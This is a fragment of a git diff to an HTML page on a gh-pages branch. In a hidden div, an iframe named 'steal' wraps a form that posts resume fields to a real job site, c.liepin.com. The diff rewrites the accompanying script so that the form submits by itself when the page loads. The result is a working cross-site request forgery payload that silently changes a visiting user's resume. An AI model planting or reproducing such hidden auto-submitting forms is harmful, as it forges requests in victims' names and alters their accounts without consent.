@@ -76,7 +76,7 @@ $ git checkout gh-pages
       </footer>
     </div>
 <div style="display:none;">
-<iframe name="steal" display="none">
+<iframe name="steal" id="steal" display="none">
 <form name="testform1" action="http://c.liepin.com/resume/saveresume" method="post">
 <input type="hidden" name="localdata-sysResumeForm.res_industry-sysResumeForm.res_jobtitle" value="040|020005"/>
 <input type="hidden" name="res_id_encode" value="4573505700E2041096305"/>
@@ -93,8 +93,8 @@ $ git checkout gh-pages
 </form>
 </iframe>
 <script type="text/javascript">
-var iframe = document.frames["steal"];
-iframe.document.Submit("transfer");
+var iframe =  document.getElementById('steal').contentWindow;
+iframe.document.getElementById('testform1').submit();
 </script>
 </div>
     
